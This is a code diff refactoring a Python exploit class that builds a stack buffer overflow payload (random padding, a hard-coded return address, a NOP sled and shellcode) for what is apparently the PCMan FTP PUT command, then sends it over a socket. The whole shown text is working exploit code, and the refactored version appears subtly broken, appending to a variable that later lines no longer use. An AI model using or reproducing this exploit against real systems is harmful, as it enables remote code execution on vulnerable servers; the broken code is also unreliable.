@@ -3,16 +3,10 @@ sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
 import core
 class pcmanPutOverflowMenu(core.Exploit):
   def generate(self, p):
-    
-    for a in range(0, 2017):
-      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
-      payload += tmp.decode('string_escape')
-    payload += "\x77\xc3\x54\x59"
-    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    f = open("../../../payloads/pcman_put.shell", "r")
-    for line in f.readlines():
-      payload += line[:-1].decode('string_escape')
-    f.close()
+    p += self.rand(2017)
+    p += "\x77\xc3\x54\x59"
+    p += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    p += self.get_shellcode()
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
     s = socket(AF_INET, SOCK_STREAM)
